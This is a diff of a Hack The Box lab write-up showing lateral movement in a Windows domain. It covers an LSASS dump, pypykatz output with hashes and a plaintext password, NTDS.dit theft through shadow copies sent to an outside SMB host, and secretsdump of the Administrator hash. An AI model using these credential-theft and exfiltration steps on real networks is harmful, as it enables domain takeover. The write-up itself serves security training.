@@ -66,7 +66,7 @@ jbetty
 
 We can see another connections in the ifconfig but... after searching something interesting for a while, we can found creds into the file .bash\_history -->
 
-<figure><img src="../../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
 
 `hwilliam : dealer-screwed-gym1`
 
@@ -164,7 +164,7 @@ Inspecting `Archive` I found the following:
 Employee-Passwords_OLD.psafe3       A     1080  Tue Apr 29 17:09:57 2025
 ```
 
-<figure><img src="../../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 I’ll get it and try to crack it using jhon because it is a psafe3 file (**Password Safe v3**) Fristly, we need extract the password hash -->
 
@@ -178,7 +178,7 @@ Now we can try to crack it -->
 john psafe.hash --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
-<figure><img src="../../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 `password : michaeljackson`
 
@@ -193,13 +193,13 @@ NICE XDD so... it is very similar than a keepass, login in this .psafe3 -->
 pwsafe Employee-Passwords_OLD.psafe3
 ```
 
-<figure><img src="../../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 JUMMM DELICIOUSSSSS. We has here users credentialsssss
 
-<figure><img src="../../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
 
 #### Credentials Obtained
 
@@ -234,8 +234,200 @@ proxychains xfreerdp3 /v:172.16.119.7  /u:bdavid /p:'caramel-cigars-reply1' /cli
 
 Once we are connect to the machine, can get three file .pcap -->
 
-<figure><img src="../../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
 
-the one that catches my attention the most is the dhcp.pcap, examite it using wireshark but... there are a rabbit hole so... now try to dump the&#x20;
+the one that catches my attention the most is the dhcp.pcap, examite it using wireshark but... there are a rabbit hole so... now try to dump the LSASS -->
+
+This requires us to:
+
+1. Open `Task Manager`
+2. Select the `Processes` tab
+3. Find and right click the `Local Security Authority Process`
+4. Select `Create dump file`
+
+<figure><img src="../../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+Now we need create a folder and make a new and best command for xfreerdp3 to create the share/folder connections -->
+
+```
+proxychains xfreerdp3 /v:172.16.119.7 /u:bdavid /p:'caramel-cigars-reply1' +clipboard /drive:share,/home/htb-ac-489480/CompData
+```
+
+```
+### My kali (with proxychains)
+[★]$ pwd
+/home/htb-ac-489480
+
+[★]$ ls
+CompData  Desktop  ...
+
+proxychains xfreerdp3 /v:172.16.119.7 /u:bdavid /p:'caramel-cigars-reply1' +clipboard /drive:share,/home/htb-ac-489480/CompData
+```
+
+> Note: Set well your directory
+
+<figure><img src="../../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+So... now we need open a new powershell and share this file, like this ->
+
+```
+copy C:\Users\bdavid\AppData\Local\Temp\lsass.dmp \\tsclient\share\
+```
+
+Once we have the file into us kali machine, use pypykatz tool to extact the info ( for more info read it: [https://eldeim.gitbook.io/brain\_fuck/checklists/certifications/htb-cpts/password-attacks/extracting-passwords-from-windows-systems/attacking-lsass#lab-questions](https://eldeim.gitbook.io/brain_fuck/checklists/certifications/htb-cpts/password-attacks/extracting-passwords-from-windows-systems/attacking-lsass#lab-questions))
+
+> Note: git clone the tool
+
+```
+pypykatz lsa minidump ../lsass.DMP 
+
+== LogonSession ==
+authentication_id 339106 (52ca2)
+session_id 2
+username stom
+domainname NEXURA
+logon_server DC01
+logon_time 2025-12-31T08:28:25.768668+00:00
+sid S-1-5-21-1333759777-277832620-2286231135-1106
+luid 339106
+	== MSV ==
+		Username: stom
+		Domain: NEXURA
+		LM: NA
+		NT: 21ea958524cfd9a7791737f8d2f764fa
+		SHA1: f2fc2263e4d7cff0fbb19ef485891774f0ad6031
+		DPAPI: 06e85cb199e902a0145ff04963e7dd7200000000
+	== WDIGEST [52ca2]==
+		username stom
+		domainname NEXURA
+		password None
+		password (hex)
+	== Kerberos ==
+		Username: stom
+		Domain: NEXURA.HTB
+		Password: calves-warp-learning1
+		password (hex)630061006c007600650073002d0077006100720070002d006c006500610072006e0069006e0067003100000000000000
+	== WDIGEST [52ca2]==
+		username stom
+		domainname NEXURA
+		password None
+		password (hex)
+	== DPAPI [52ca2]==
+		luid 339106
+		key_guid 33fbd25b-2488-49ef-9fa2-7a96959acb95
+		masterkey 0528dd7d0cfa8ca48e12bf937ab2dcd92fa588f958716a9abc6fa49444b9d580a0ab3d8f7657e4a4d327fe7df824c112ec8a3d04c22f8050e669c8f256983cda
+		sha1_masterkey 1cf754450d3c0515af105fd64ef952f9486495fb
+
+== LogonSession ==
+authentication_id 339070 (52c7e)
+session_id 2
+username stom
+domainname NEXURA
+logon_server DC01
+logon_time 2025-12-31T08:28:25.737425+00:00
+sid S-1-5-21-1333759777-277832620-2286231135-1106
+luid 339070
+	== MSV ==
+		Username: stom
+		Domain: NEXURA
+		LM: NA
+		NT: 21ea958524cfd9a7791737f8d2f764fa
+		SHA1: f2fc2263e4d7cff0fbb19ef485891774f0ad6031
+		DPAPI: 06e85cb199e902a0145ff04963e7dd7200000000
+	== WDIGEST [52c7e]==
+		username stom
+		domainname NEXURA
+		password None
+		password (hex)
+	== Kerberos ==
+		Username: stom
+		Domain: NEXURA.HTB
+		Password: calves-warp-learning1
+		password (hex)630061006c007600650073002d0077006100720070002d006c006500610072006e0069006e0067003100000000000000
+	== WDIGEST [52c7e]==
+		username stom
+		domainname NEXURA
+		password None
+		password (hex)
+
+```
+
+NICE! We has another credential --> `stom:calves-warp-learning1` , there is of DC01, scan it -->
+
+```
+sudo proxychains -q nmap -sT -Pn -p 3389,445,135,22 172.16.119.11 --open -T4 -vv
+ 
+[redacted]
+PORT     STATE SERVICE       REASON
+135/tcp  open  msrpc         syn-ack
+445/tcp  open  microsoft-ds  syn-ack
+3389/tcp open  ms-wbt-server syn-ack
+```
+
+Connect via RDP to this ip and share the folder, just in case
+
+```
+proxychains xfreerdp3 /v:172.16.119.11 /u:stom /p:'calves-warp-learning1' /clipboard /drive:share,/home/htb-ac-489480/CompData
+```
+
+<figure><img src="../../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+We can start with looking at the local group membership using the command:
+
+```
+net localgroup
+```
+
+<figure><img src="../../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+This is practically a victory beacuse we are in admin group, but we need the NTML hash of admin. How we are in admin group, can dump the NTDS and get the hashes -->
+
+> Note: Open a PowerShell as Administrador
+
+First, I’ll capture the system registry key:
+
+```
+reg.exe save hklm\system C:\system.save
+```
+
+Now I’ll use **vssadmin** to create a Volume Shadow Copy of the `C:` drive:
+
+```
+vssadmin CREATE SHADOW /For=C: 
+...
+Shadow Copy ID: {...}
+Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+```
+
+I’ll now copy the `NTDS.dit`:||
+
+```
+cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit c:\NTDS
+```
+
+```
+cmd.exe /c move C:\NTDS \\10.10.14.227\htb_sharec
+md.exe /c move C:\system.save \\10.10.14.227\htb_share
+```
+
+I’ll now copy those files to the shared file of my machine and then extract the hashes in my machine:
+
+```
+cmd.exe /c move C:\NTDS \\tsclient\share
+cmd.exe /c move C:\system.save \\tsclient\share
+```
+
+<figure><img src="../../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+Extract / decript using impacket-secretdump -->
+
+```
+impacket-secretsdump -ntds NTDS -system system.save LOCAL
+ 
+[redacted]
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:36e09e1e6ade94d63fbcab5e5b8d6d23:::
+```
